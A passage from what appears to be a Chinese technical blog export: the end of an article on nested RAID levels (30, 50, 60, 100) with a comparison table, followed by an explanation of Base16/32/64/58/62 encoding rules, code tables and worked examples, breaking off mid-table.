30&#x2F;53"></a>9.3、RAID 30&#x2F;53</h3><p><code>RAID 30</code>也称为专用奇偶位阵列条带，具有<code>RAID 0</code>和<code>RAID 3</code>的特性，由两组<code>RAID 3</code>的磁盘（每组3个磁盘）组成阵列，使用专用奇偶位，而这两种磁盘再组成一个<code>RAID 0</code>的阵列，实现跨磁盘抽取数据。<code>RAID 30</code>提供容错能力，并支持更大的卷尺寸。像<code>RAID 10</code>一样，<code>RAID 30</code>也提供高可靠性。</p><ul><li>优点：<ul><li>提供组内单个磁盘故障的恢复能力；</li><li>结合 <code>RAID 3</code>和 <code>RAID0</code>，实现数据的高可靠性，用<code>RAID 0</code>的速度加<code>RAID 3</code>的安全；</li></ul></li><li>缺点：<ul><li>数据恢复比较复杂；</li></ul></li></ul><img src="https://cdn.bugwz.com/raid-30.png" alt="RAID 30" style="zoom:30%;" /><h3 id="9-4、RAID-50"><a href="#9-4、RAID-50" class="headerlink" title="9.4、RAID 50"></a>9.4、RAID 50</h3><p><code>RAID 50</code> 是<code>RAID 5</code>与<code>RAID 0</code>的结合。它由两组<code>RAID 5</code>磁盘组成，每一组都使用了分布式奇偶位，而两组硬盘再组建成<code>RAID 0</code>，实现跨磁盘抽取数据。每个<code>RAID 5</code>子磁盘组要求至少<code>三块</code>硬盘，最少需要<code>六块</code>磁盘，它最适合需要高可靠性存储、高读取速度、高数据传输性能的应用。这些应用包括事务处理和有许多用户存取小文件的办公应用程序。</p><ul><li><p>优点：</p><ul><li>具备更高的容错能力；</li><li>提供组内单个磁盘故障的恢复能力；</li><li>具备更快数据读取速率的潜力；</li></ul></li><li><p>缺点：</p><ul><li>故障后重建信息的时间比镜像配置情况下要长；</li></ul></li></ul><img src="https://cdn.bugwz.com/raid-50.png" alt="RAID 50" style="zoom:30%;" /><h3 id="9-5、RAID-60"><a href="#9-5、RAID-60" class="headerlink" title="9.5、RAID 60"></a>9.5、RAID 60</h3><p><code>RAID 60 </code>是 <code>RAID 6</code>与<code>RAID 0</code>的结合，将<code>RAID 0</code>直接块级条带化与<code>RAID 6</code>的分布式双奇偶校验相结合。每个<code>RAID 6</code>集中的两个磁盘可能会在没有数据丢失的情况下发生故障。此外，在一个<code>RAID 6</code>集中重建单个磁盘时磁盘故障不会导致数据丢失。至少需要八个磁盘才能实现。</p><ul><li><p>优点：</p><ul><li>具备更高的容错能力；</li><li>提供<code>RAID 6</code>组内单个磁盘故障的恢复能力；</li><li>具备更快数据读取速率的潜力；</li></ul></li><li><p>缺点：</p><ul><li>由于奇偶校验计算的额外开销，写入方面略差于<code>RAID 50</code>；</li></ul></li></ul><img src="https://cdn.bugwz.com/raid-60.png" alt="RAID 60" style="zoom:50%;" /><h3 id="9-6、RAID-100"><a href="#9-6、RAID-100" class="headerlink" title="9.6、RAID 100"></a>9.6、RAID 100</h3><p><code>RAID 100</code>  也称为 <code>RAID 10+0</code>，是<code>RAID 10</code>与<code>RAID 0</code>的组合，即条带化的 <code>RAID10</code> 。<code>RAID100</code>最顶层的 <code>RAID 0</code> ，即条带化任务，通常由软件层来完成。<code>RAID 100</code> 突破了单个 RAID 控制器对物理磁盘数量的限制，可以获得更高的 I&#x2F;O 负载均衡， I&#x2F;O 压力分散到更多的磁盘上，进一步提高随机读性能，并有效降低热点盘故障风险。因此， <code>RAID 100</code> 通常是大数据库的最佳选择。</p><ul><li><p>优点：</p><ul><li>突破了单个 <code>RAID</code> 控制器对物理磁盘数量的限制，可以获得更高的 I&#x2F;O 负载均衡；</li><li><code> I/O</code> 压力分散到更多的磁盘上，进一步提高随机读性能；</li><li>有效降低热点盘故障风险；</li></ul></li><li><p>缺点：</p><ul><li>实现比较复杂，成本比较高；</li><li>磁盘的利用率仅为<code>50%</code>；</li></ul></li></ul><img src="https://cdn.bugwz.com/raid-100.png" alt="RAID 100" style="zoom:40%;" /><h2 id="十、数据表格对比"><a href="#十、数据表格对比" class="headerlink" title="十、数据表格对比"></a>十、数据表格对比</h2><table><thead><tr><th align="center">RAID等级</th><th align="center">别名</th><th align="center">容错性</th><th align="center">冗余类型</th><th align="center">热备份选择</th><th align="center">读性能</th><th align="center">随机写性能</th><th align="center">连续写性能</th><th align="center">磁盘数</th><th align="center">可用容量</th></tr></thead><tbody><tr><td align="center">RAID 0</td><td align="center">条带</td><td align="center">无</td><td align="center">无</td><td align="center">无</td><td align="center">高</td><td align="center">高</td><td align="center">高</td><td align="center">n&gt;&#x3D;1</td><td align="center">100%</td></tr><tr><td align="center">RAID 1</td><td align="center">镜像</td><td align="center">有</td><td align="center">有</td><td align="center">有</td><td align="center">低</td><td align="center">低</td><td align="center">低</td><td align="center">2n(n&gt;&#x3D;1)</td><td align="center">50%</td></tr><tr><td align="center">RAID 2</td><td align="center">海明码校验条带</td><td align="center">有</td><td align="center"></td><td align="center"></td><td align="center">高</td><td align="center">高</td><td align="center">高</td><td align="center">n&gt;&#x3D;2</td><td align="center"></td></tr><tr><td align="center">RAID 3</td><td align="center">专用奇偶校验条带</td><td align="center">有</td><td align="center">有</td><td align="center">有</td><td align="center">高</td><td align="center">低</td><td align="center">低</td><td align="center">n&gt;&#x3D;3</td><td align="center">(n-1)&#x2F;n</td></tr><tr><td align="center">RAID 4</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">RAID 5</td><td align="center">分布奇偶校验条带</td><td align="center">有</td><td align="center">有</td><td align="center">有</td><td align="center">高</td><td align="center">一般</td><td align="center">低</td><td align="center">n&gt;&#x3D;3</td><td align="center">(n-1)&#x2F;n</td></tr><tr><td align="center">RAID 6</td><td align="center">双重奇偶校验条带</td><td align="center">有</td><td align="center">有</td><td align="center">有</td><td align="center">高</td><td align="center">低</td><td align="center">低</td><td align="center">n&gt;&#x3D;4</td><td align="center">(n-2)&#x2F;n</td></tr><tr><td align="center">RAID 7</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">RAID 01</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">50%</td></tr><tr><td align="center">RAID 10</td><td align="center">镜像加条带</td><td align="center">有</td><td align="center">有</td><td align="center">有</td><td align="center">高</td><td align="center">一般</td><td align="center">一般</td><td align="center">2n(n&gt;&#x3D;4)</td><td align="center">50%</td></tr><tr><td align="center">RAID 30</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">RAID 50</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">RAID 60</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">RAID 100</td><td align="center">条带化的 RAID10</td><td align="center"></td><td align="center">有</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">50%</td></tr></tbody></table><p><strong>参考网址：</strong></p><ul><li><a href="https://blog.csdn.net/weixin_42672054/article/details/81206392">https://blog.csdn.net/weixin_42672054/article/details/81206392</a></li><li><a href="http://www.chinastor.com/baike/raid/">http://www.chinastor.com/baike/raid/</a></li><li><a href="http://www.chinastor.com/jishu/raid/12123M292017.html">http://www.chinastor.com/jishu/raid/12123M292017.html</a></li><li><a href="https://www.cnblogs.com/ivictor/p/6099807.html">https://www.cnblogs.com/ivictor/p/6099807.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Raid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseX编码规则解析</title>
      <link href="/2019/11/18/basex/"/>
      <url>/2019/11/18/basex/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Base16"><a href="#一、Base16" class="headerlink" title="一、Base16"></a>一、Base16</h2><h3 id="1-1、编码规则："><a href="#1-1、编码规则：" class="headerlink" title="1.1、编码规则："></a>1.1、编码规则：</h3><p><code>Base16</code>编码使用<code>16</code>个<code>ASCII</code>可打印字符（数字<code>0-9</code>和字母<code>A-F</code>）对任意字节数据进行编码。</p><ul><li><p>获取输入字符串每个字节的二进制值（输入的非ASCII字符，使用UTF-8字符集）；</p></li><li><p>将获得的二进制值串联进来；</p></li><li><p>按照<code>4比特</code>为一组进行切分（<code>8比特</code>数据按照<code>4比特</code>切分刚好是两组，因此<code>Base16</code>无填充符号<code>=</code>）；</p></li><li><p>将每组二进制数分别转换成十进制；</p></li><li><p>按照<code>Base16</code>对应的编码表将对应的编码串接起来就是<code>Base16</code>编码；</p></li></ul><h3 id="1-2、编码特征"><a href="#1-2、编码特征" class="headerlink" title="1.2、编码特征"></a>1.2、编码特征</h3><p>Base16编码后的数据量是原数据的两倍，1000比特数据需要250个字符（即 250*8&#x3D;2000 比特）。换句话说：Base16使用两个ASCII字符去编码原数据中的一个字节数据。</p><p>Base16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及<code>Base32</code>和<code>Base64</code>中的<code>=</code>符号。</p><h3 id="1-3、编码表"><a href="#1-3、编码表" class="headerlink" title="1.3、编码表"></a>1.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">0</td><td align="center">8</td><td align="center">8</td></tr><tr><td align="center">1</td><td align="center">1</td><td align="center">9</td><td align="center">9</td></tr><tr><td align="center">2</td><td align="center">2</td><td align="center">10</td><td align="center">A</td></tr><tr><td align="center">3</td><td align="center">3</td><td align="center">11</td><td align="center">B</td></tr><tr><td align="center">4</td><td align="center">4</td><td align="center">12</td><td align="center">C</td></tr><tr><td align="center">5</td><td align="center">5</td><td align="center">13</td><td align="center">D</td></tr><tr><td align="center">6</td><td align="center">6</td><td align="center">14</td><td align="center">E</td></tr><tr><td align="center">7</td><td align="center">7</td><td align="center">15</td><td align="center">F</td></tr></tbody></table><h3 id="1-4、编码示例"><a href="#1-4、编码示例" class="headerlink" title="1.4、编码示例"></a>1.4、编码示例</h3><ul><li>待编码字符串：<code>123</code>；</li><li>编码后字符串：<code>313233</code>；</li></ul><table><thead><tr><th align="center">原始字符(ASCII可显示字符)</th><th align="center">对应二进制(对应两个)</th><th align="center">对应编码后字符串</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">0011 0001</td><td align="center">31</td></tr><tr><td align="center">2</td><td align="center">0011 0010</td><td align="center">32</td></tr><tr><td align="center">3</td><td align="center">0011 0011</td><td align="center">33</td></tr></tbody></table><h2 id="二、Base32"><a href="#二、Base32" class="headerlink" title="二、Base32"></a>二、Base32</h2><h3 id="2-1、编码规则"><a href="#2-1、编码规则" class="headerlink" title="2.1、编码规则"></a>2.1、编码规则</h3><p><code>Base32</code>编码是使用<code>32</code>个<code>ASCII</code>可打印字符（字母<code>A-Z</code>和数字<code>2-7</code>）对任意字节数据进行编码。</p><ul><li><p>获取输入字符串每个字节的二进制值（输入的非ASCII字符，使用UTF-8字符集）；</p></li><li><p>将获得的二进制值串联进来；</p></li><li><p>按照<code>5比特</code>为一组进行切分；</p></li><li><p>将每组二进制数分别转换成十进制；</p></li><li><p>按照<code>Base32</code>对应的编码表将对应的编码串接起来就是<code>Base32</code>编码；</p></li></ul><h3 id="2-2、编码特征"><a href="#2-2、编码特征" class="headerlink" title="2.2、编码特征"></a>2.2、编码特征</h3><ul><li>数据的二进制传输是按照<code>8比特</code>一组进行（即一个字节）；</li><li><code>Base32</code>按<code>5比特</code>切分的二进制数据必须是<code>40比特的倍数</code>（5和8的最小公倍数），最小为<code>40个比特</code>；</li><li>编码后的字符串不用区分大小写并排除了容易混淆的字符，可以方便地由人类使用并由计算机处理；</li></ul><p><strong>与Base64相比，Base32具有许多优点：</strong></p><ul><li>适合不区分大小写的文件系统，更利于人类口语交流或记忆；</li><li>结果可以用作文件名，因为它不包含路径分隔符 “&#x2F;”等符号；</li><li>排除了视觉上容易混淆的字符，因此可以准确的人工录入（例如，RFC4648符号集忽略了数字“1”、“8”和“0”，因为它们可能与字母“I”，“B”和“O”混淆）；</li><li>排除填充符号“&#x3D;”的结果可以包含在URL中，而不编码任何字符；</li></ul><p><strong>与Base16相比，Base32的优势：</strong></p><ul><li>Base32比Base16占用的空间更小（1000比特数据Base32需要200个字符，而Base16则为250个字符）；</li></ul><p><strong>Base32的缺点：</strong></p><ul><li>Base32比Base64多占用大约20％的空间，因为Base32使用8个ASCII字符去编码原数据中的5个字节数据，而Base64是使用4个ASCII字符去编码原数据中的3个字节数据；</li></ul><h3 id="2-3、编码表"><a href="#2-3、编码表" class="headerlink" title="2.3、编码表"></a>2.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">A</td><td align="center">8</td><td align="center">I</td><td align="center">16</td><td align="center">Q</td><td align="center">24</td><td align="center">Y</td></tr><tr><td align="center">1</td><td align="center">B</td><td align="center">9</td><td align="center">J</td><td align="center">17</td><td align="center">R</td><td align="center">25</td><td align="center">Z</td></tr><tr><td align="center">2</td><td align="center">C</td><td align="center">10</td><td align="center">K</td><td align="center">18</td><td align="center">S</td><td align="center">26</td><td align="center">2</td></tr><tr><td align="center">3</td><td align="center">D</td><td align="center">11</td><td align="center">L</td><td align="center">19</td><td align="center">T</td><td align="center">27</td><td align="center">3</td></tr><tr><td align="center">4</td><td align="center">E</td><td align="center">12</td><td align="center">M</td><td align="center">20</td><td align="center">U</td><td align="center">28</td><td align="center">4</td></tr><tr><td align="center">5</td><td align="center">F</td><td align="center">13</td><td align="center">N</td><td align="center">21</td><td align="center">V</td><td align="center">29</td><td align="center">5</td></tr><tr><td align="center">6</td><td align="center">G</td><td align="center">14</td><td align="center">O</td><td align="center">22</td><td align="center">W</td><td align="center">30</td><td align="center">6</td></tr><tr><td align="center">7</td><td align="center">H</td><td align="center">15</td><td align="center">P</td><td align="center">23</td><td align="center">X</td><td align="center">31</td><td align="center">7</td></tr><tr><td align="center">填充</td><td align="center">&#x3D;</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="2-4、编码示例"><a href="#2-4、编码示例" class="headerlink" title="2.4、编码示例"></a>2.4、编码示例</h3><ul><li>待编码字符串：<code>123</code>；</li><li>编码后字符串：<code>GEZDG===</code>；</li></ul><table><thead><tr><th align="center">原始字符(ASCII可显示字符)</th><th align="center">对应二进制(对应两个)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">0011 0001</td></tr><tr><td align="center">2</td><td align="center">0011 0010</td></tr><tr><td align="center">3</td><td align="center">0011 0011</td></tr></tbody></table><ul><li>拼接后的二进制：<code>00110001 00110010 00110011</code>；</li><li>按照5比特进行拆分：<code>00110 00100 11001 00011 0011</code>；</li><li>最后一组的位数不足5，末位填充0后：<code>00110 00100 11001 00011 00110</code>；</li><li>对应字符串位：<code>GEZDG</code>；</li><li>由于最少为40个比特，计算<code>40/5=8</code>，因此需要补<code>3</code>个<code>=</code>，最终为<code>GEZDG===</code>；</li></ul><h2 id="三、Base64"><a href="#三、Base64" class="headerlink" title="三、Base64"></a>三、Base64</h2><h3 id="3-1、编码规则"><a href="#3-1、编码规则" class="headerlink" title="3.1、编码规则"></a>3.1、编码规则</h3><p><code>Base64</code>编码是使用<code>64</code>个<code>ASCII</code>可打印字符（<code>A-Z</code>、<code>a-z</code>、<code>0-9</code>、<code>+</code>、<code>/</code>）对任意字节数据进行编码。</p><ul><li><p>获取输入字符串每个字节的二进制值（若不足8比特则高位补0）；</p></li><li><p>将获得的二进制值串联进来；</p></li><li><p>按照<code>6特</code>为一组进行切分；</p></li><li><p>将每组二进制数分别转换成十进制；</p></li><li><p>按照<code>Base64</code>对应的编码表将对应的编码串接起来就是<code>Base64</code>编码；</p></li></ul><p>由于二进制数据是按照<code>8比特</code>一组进行传输，因此<code>Base64</code>按照<code>6比特</code>一组切分的二进制数据必须是<code>24比特</code>的倍数（6和8的最小公倍数），<code>24比特</code>就是<code>3个字节</code>，若<code>原字节序列</code>数据长度<code>不是3的倍数</code>时：</p><ul><li><p>原字节序列剩下<code>1个</code>输入数据，则在编码结果后<code>加1个=</code>；</p></li><li><p>原字节序列剩下<code>2个</code>输入数据，则在编码结果后<code>加2个=</code>；</p></li></ul><h3 id="3-2、编码特征"><a href="#3-2、编码特征" class="headerlink" title="3.2、编码特征"></a>3.2、编码特征</h3><p>完整的<code>Base64</code>定义可见<code>RFC1421</code>和<code>RFC2045</code>。因为<code>Base64</code>算法是将<code>3个字节原数据</code>编码为<code>4个字节新数据</code>，所以<code>Base64</code>编码后的数据比原始数据略长，为原来的<code>4/3</code>。在电子邮件中，根据<code>RFC822</code>规定，每<code>76</code>个字符，还需要加上<code>一个回车换行</code>。可以估算编码后数据长度大约为原长的<code>135.1%</code>。</p><p><code>Base64</code>可用于任意数据的底层二进制数据编码，以应用于只能传输<code>ASCII</code>字符的场合。不过最常用于文本数据的处理传输，例如在<code>MIME</code>格式的电子邮件中，<code>Base64</code>可以用来编码邮件内容，方便在不同语言计算机间传输而不乱码，注意是传输而不是显示，例如在西欧地区计算机上使用<code>UTF-8</code>编码即可正常显示中文（安装有对应字库），但是它未必能正常传输中文，这时转换为<code>Base64</code>便无此顾虑。</p><p><code>Base64</code>编码若无特别说明，通常约定<code>非ASCII字符</code>按照<code>UTF-8字符集</code>进行编码处理。</p><h3 id="3-3、编码表"><a href="#3-3、编码表" class="headerlink" title="3.3、编码表"></a>3.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">A</td><td align="center">16</td><td align="center">Q</td><td align="center">32</td><td align="center">g</td><td align="center">48</td><td align="center">w</td></tr><tr><td align="center">1</td><td align="center">B</td><td align="center">17</td><td align="center">R</td><td align="center">33</td><td align="center">h</td><td align="center">49</td><td align="center">x</td></tr><tr><td align="center">2</td><td align="center">C</td><td align="center">18</td><td align="center">S</td><td align="center">34</td><td align="center">i</td><td align="center">50</td><td align="center">y</td></tr><tr><td align="center">3</td><td align="center">D</td><td align="center">19</td><td align="center">T</td><td align="center">35</td><td align="center">j</td><td align="center">51</td><td align="center">z</td></tr><tr><td align="center">4</td><td align="center">E</td><td align="center">20</td><td align="center">U</td><td align="center">36</td><td align="center">k</td><td align="center">52</td><td align="center">0</td></tr><tr><td align="center">5</td><td align="center">F</td><td align="center">21</td><td align="center">V</td><td align="center">37</td><td align="center">l</td><td align="center">53</td><td align="center">1</td></tr><tr><td align="center">6</td><td align="center">G</td><td align="center">22</td><td align="center">W</td><td align="center">38</td><td align="center">m</td><td align="center">54</td><td align="center">2</td></tr><tr><td align="center">7</td><td align="center">H</td><td align="center">23</td><td align="center">X</td><td align="center">39</td><td align="center">n</td><td align="center">55</td><td align="center">3</td></tr><tr><td align="center">8</td><td align="center">I</td><td align="center">24</td><td align="center">Y</td><td align="center">40</td><td align="center">o</td><td align="center">56</td><td align="center">4</td></tr><tr><td align="center">9</td><td align="center">J</td><td align="center">25</td><td align="center">Z</td><td align="center">41</td><td align="center">p</td><td align="center">57</td><td align="center">5</td></tr><tr><td align="center">10</td><td align="center">K</td><td align="center">26</td><td align="center">a</td><td align="center">42</td><td align="center">q</td><td align="center">58</td><td align="center">6</td></tr><tr><td align="center">11</td><td align="center">L</td><td align="center">27</td><td align="center">b</td><td align="center">43</td><td align="center">r</td><td align="center">59</td><td align="center">7</td></tr><tr><td align="center">12</td><td align="center">M</td><td align="center">28</td><td align="center">c</td><td align="center">44</td><td align="center">s</td><td align="center">60</td><td align="center">8</td></tr><tr><td align="center">13</td><td align="center">N</td><td align="center">29</td><td align="center">d</td><td align="center">45</td><td align="center">t</td><td align="center">61</td><td align="center">9</td></tr><tr><td align="center">14</td><td align="center">O</td><td align="center">30</td><td align="center">e</td><td align="center">46</td><td align="center">u</td><td align="center">62</td><td align="center">+</td></tr><tr><td align="center">15</td><td align="center">P</td><td align="center">31</td><td align="center">f</td><td align="center">47</td><td align="center">v</td><td align="center">63</td><td align="center">&#x2F;</td></tr></tbody></table><h3 id="3-4、编码示例"><a href="#3-4、编码示例" class="headerlink" title="3.4、编码示例"></a>3.4、编码示例</h3><ul><li>待编码字符串：<code>1234</code>；</li><li>编码后字符串：<code>MTIzNA==</code>；</li></ul><table><thead><tr><th align="center">原始字符(ASCII可显示字符)</th><th align="center">对应二进制(对应两个)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">00110001</td></tr><tr><td align="center">2</td><td align="center">00110010</td></tr><tr><td align="center">3</td><td align="center">00110011</td></tr><tr><td align="center">4</td><td align="center">00110100</td></tr></tbody></table><ul><li>拼接后的二进制：<code>00110001 00110010 00110011 00110100</code>；</li><li>按照<code>6比特</code>进行拆分：<code>001100 010011 001000 110011 001101 00</code>；</li><li>最后一组的位数<code>不足5</code>，末位填充0后：<code>001100 010011 001000 110011 001101 000000</code>；</li><li>对应编码表的字符串：<code>MTIzNA</code>；</li><li>原字节序列的长度为<code>4</code>，不为<code>3</code>的倍数，还差<code>2个</code>输入数据，所以需要补上<code>2个=</code>，最终为：<code>MTIzNA==</code>；</li></ul><h2 id="四、Base58"><a href="#四、Base58" class="headerlink" title="四、Base58"></a>四、Base58</h2><h3 id="4-1、编码规则"><a href="#4-1、编码规则" class="headerlink" title="4.1、编码规则"></a>4.1、编码规则</h3><p><code>Base58</code>编码使用<code>58</code>个<code>ASCII</code>可打印字符（不使用数字<code>0</code>，大写字母<code>O</code>、大写字母<code>I</code>、小写字母<code>l</code>，以及<code>+</code>和<code>/</code>）对 <strong>数字</strong> 进行编码。</p><ul><li>通过对数字不断<code>取余58</code>，依据获取的余数对照编码表得到对应的编码值；</li><li>通过不断的对数字进行<code>取整</code>操作，得到新的数字进入下一个循环；</li><li>当新的数字为<code>0</code>时，结束编码；</li><li>通过对循环中每次得到的编码按照得到的先后顺序逆序排序（即第一次得到的编码在最终编码值的末尾），得到最终的编码值；</li></ul><h3 id="4-2、编码特征"><a href="#4-2、编码特征" class="headerlink" title="4.2、编码特征"></a>4.2、编码特征</h3><ul><li>在某些字体下，<code>数字0</code>和<code>字母大写O</code>，以及<code>字母大写I</code>和<code>字母小写l</code>会非常相似，为避免混淆，不使用这些字符；</li><li>不使用<code>+</code>和<code>/</code>的原因是非字母或数字的字符串作为帐号较难被接受；</li><li>没有标点符号，通常不会被从中间分行；</li><li>大部分的软件支持双击选择整个字符串；</li><li>编码后的数据为原始的数据长度的<code>1.37倍</code>，稍稍多于Base64的1.33倍；</li><li>用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址；</li></ul><h3 id="4-3、编码表"><a href="#4-3、编码表" class="headerlink" title="4.3、编码表"></a>4.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">1</td><td align="center">15</td><td align="center">G</td><td align="center">30</td><td align="center">X</td><td align="center">45</td><td align="center">n</td></tr><tr><td align="center">1</td><td align="center">2</td><td align="center">16</td><td align="center">H</td><td align="center">31</td><td align="center">Y</td><td align="center">46</td><td align="center">o</td></tr><tr><td align="center">2</td><td align="center">3</td><td align="center">17</td><td align="center">J</td><td align="center">32</td><td align="center">Z</td><td align="center">47</td><td align="center">p</td></tr><tr><td align="center">3</td><td align="center">4</td><td align="center">18</td><td align="center">K</td><td align="center">33</td><td align="center">a</td><td align="center">48</td><td align="center">q</td></tr><tr><td align="center">4</td><td align="center">5</td><td align="center">19</td><td align="center">L</td><td align="center">34</td><td align="center">b</td><td align="center">49</td><td align="center">r</td></tr><tr><td align="center">5</td><td align="center">6</td><td align="center">20</td><td align="center">M</td><td align="center">35</td><td align="center">c</td><td align="center">50</td><td align="center">s</td></tr><tr><td align="center">6</td><td align="center">7</td><td align="center">21</td><td align="center">N</td><td align="center">36</td><td align="center">d</td><td align="center">51</td><td align="center">t</td></tr><tr><td align="center">7</td><td align="center">8</td><td align="center">22</td><td align="center">P</td><td align="center">37</td><td align="center">e</td><td align="center">52</td><td align="center">u</td></tr><tr><td align="center">8</td><td align="center">9</td><td align="center">23</td><td align="center">Q</td><td align="center">38</td><td align="center">f</td><td align="center">53</td><td align="center">v</td></tr><tr><td align="center">9</td><td align="center">A</td><td align="center">24</td><td align="center">R</td><td align="center">39</td><td align="center">g</td><td align="center">54</td><td align="center">w</td></tr><tr><td align="center">10</td><td align="center">B</td><td align="center">25</td><td align="center">S</td><td align="center">40</td><td align="center">h</td><td align="center">55</td><td align="center">x</td></tr><tr><td align="center">11</td><td align="center">C</td><td align="center">26</td><td align="center">T</td><td align="center">41</td><td align="center">i</td><td align="center">56</td><td align="center">y</td></tr><tr><td align="center">12</td><td align="center">D</td><td align="center">27</td><td align="center">U</td><td align="center">42</td><td align="center">j</td><td align="center">57</td><td align="center">z</td></tr><tr><td align="center">13</td><td align="center">E</td><td align="center">28</td><td align="center">V</td><td align="center">43</td><td align="center">k</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">14</td><td align="center">F</td><td align="center">29</td><td align="center">W</td><td align="center">44</td><td align="center">m</td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="4-4、编码示例"><a href="#4-4、编码示例" class="headerlink" title="4.4、编码示例"></a>4.4、编码示例</h3><ul><li>待编码数字：<code>123</code>；</li><li>编码后字符串：<code>38</code>；</li></ul><p><strong>解析过程如下所示：</strong></p><ul><li>对数字进行<code>取余58</code>的操作，获取余数：<code>123%58=7</code>，得到第一个编码为<code>8</code>；</li><li>对数字进行取整操作，新的数字为取整之后的值：<code>123/58=2</code>；</li><li>对新数字进行<code>取余58</code>的操作，获取余数：<code>2%58=2</code>，得到第二个编码为<code>3</code>；</li><li>依次循环最终新数字为<code>0</code>时结束；</li><li>最后得到的编码为<code>38</code>；</li></ul><h2 id="五、Base62"><a href="#五、Base62" class="headerlink" title="五、Base62"></a>五、Base62</h2><h3 id="5-1、编码规则"><a href="#5-1、编码规则" class="headerlink" title="5.1、编码规则"></a>5.1、编码规则</h3><p><code>Base62</code>编码使用<code>62</code>个<code>ASCII</code>可打印字符（数字<code>0～9</code>，字母<code>A~Z</code>，<code>a~z</code>）进行编码。</p><ul><li>通过对数字不断<code>取余62</code>，依据获取的余数对照编码表得到对应的编码值；</li><li>通过不断的对数字进行<code>取整</code>操作，得到新的数字进入下一个循环；</li><li>当新的数字为<code>0</code>时，结束编码；</li><li>通过对循环中每次得到的编码按照得到的先后顺序逆序排序（即第一次得到的编码在最终编码值的末尾），得到最终的编码值；</li></ul><h3 id="5-2、编码特征"><a href="#5-2、编码特征" class="headerlink" title="5.2、编码特征"></a>5.2、编码特征</h3><ul><li><code>Base62</code>和<code>Base64</code>相比唯一的区别就是少了两个特殊符号；</li><li><code>Base62</code>是一个改掉了<code>Base64</code>所有缺点的算法；</li><li>唯一的不足是因为码空间小了，会多占用<code>1/32</code>空间；</li><li>常被用来做短url的映射；</li></ul><h3 id="5-3、编码表"><a href="#5-3、编码表" class="headerlink" title="5.3、编码表"></a>5.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">0</td><td align="center">16</td><td align="center">G</td><td align="center">32</td><td align="center">W</td><td align="center">48</td><td align="center">m</td></tr><tr><td align="center">1</td><td align="center">1</td><td align="center">17</td><td align="center">H</td><td align="center">33</td><td align="center">X</td><td align="center">49</td><td align="center">n</td></tr><tr><td align="center">2</td><td align="center">2</td><td align="center">18</td><td align="center">I</td><td align="center">34</td><td align="center">Y</td><td align="center">50</td><td align="center">o</td></tr><tr><td align="center">3</td><td align="center">3</td><td align="center">19</td><td align="center">J</td><td align="center">35</td><td align="center">Z</td><td align="center">51</td><td align="center">p</td></tr><tr><td align="center">4</td><td align="center">4</td><td align="center">20</td><td align="center">K</td><td align="center">36</td><td align="center">a</td><td align="center">52</td><td align="center">q</td></tr><tr><td align="center">5</td><td align="center">5</td><td align="center">21</td><td align="center">L</td><td align="center">37</td><td align="center">b</td><td align="center">53</td><td align="center">r</td></tr><tr><td align="center">6</td><td align="center">6</td><td align="center">22</td><td align="center">M</td><td align="center">38</td><td align="center">c</td><td align="center">54</td><td align="center">s</td></tr><tr><td align="center">7</td><td align="center">7</td><td align="center">23</td><td align="center">N</td><td align="center">39</td><td align="center">d</td><td align="center">55</td><td align="center">t</td></tr><tr><td align="center">8</td><td align="center">8</td><td align="center">24</td><td align="center">O</td><td align="center">40</td><td align="center">e</td><td align="center">56</td><td align="center">u</td></tr><tr><td align="center">9</td><td align="center">9</td><td align="center">25</td><td align="center">P</td><td align="center">41</td><td align="center">f</td><td align="center">57</td><td align="center">v</td></tr><tr><td align="center">10</td><td align="center">A</td><td align="center">26</td><td align="center">Q</td><td align="center">42</td><td align="center">g</td><td align="center">58</td><td align="center">w</td></tr><tr><td align="center">11</td><td align="center">B</td><td align="center">27</td><td align="center">R</td><td 